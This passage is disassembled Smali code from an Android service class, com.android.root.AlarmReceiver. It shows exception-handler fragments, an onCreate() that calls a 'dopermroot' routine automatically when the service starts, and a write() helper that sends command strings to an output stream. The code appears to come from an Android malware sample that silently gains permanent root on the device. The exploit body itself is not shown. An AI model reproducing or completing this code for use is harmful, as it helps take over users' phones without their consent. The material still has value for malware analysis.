    :catchall_4
    move-exception v10

    move-object v7, v8

    .end local v8           #reader:Ljava/io/BufferedReader;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    goto :goto_d

    .line 259
    .end local v6           #pidIndex:I
    :catch_7
    move-exception v10

    move-object v1, v10

    goto :goto_c

    .line 261
    .end local v0           #cmd:Ljava/lang/String;
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
    :catchall_5
    move-exception v11

    move-object v7, v8

    .end local v8           #reader:Ljava/io/BufferedReader;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    goto/16 :goto_a

    .line 259
    .end local v6           #pidIndex:I
    :catch_8
    move-exception v11

    move-object v1, v11

    goto/16 :goto_9

    .line 261
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
    :catchall_6
    move-exception v10

    move-object v7, v8

    .end local v8           #reader:Ljava/io/BufferedReader;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    goto/16 :goto_5

    .line 259
    .end local v6           #pidIndex:I
    :catch_9
    move-exception v10

    move-object v1, v10

    goto/16 :goto_4
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 28
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 32
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 33
    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/android/root/AlarmReceiver;->dopermroot(Landroid/content/Context;)V

    .line 34
    return-void
.end method

.method public write(Ljava/io/FileOutputStream;Ljava/lang/String;)V
    .locals 2
    .parameter "out"
    .parameter "command"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 211
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    .line 212
    invoke-virtual {p2}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 213
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->flush()V

    .line 214
    return-void
.end method
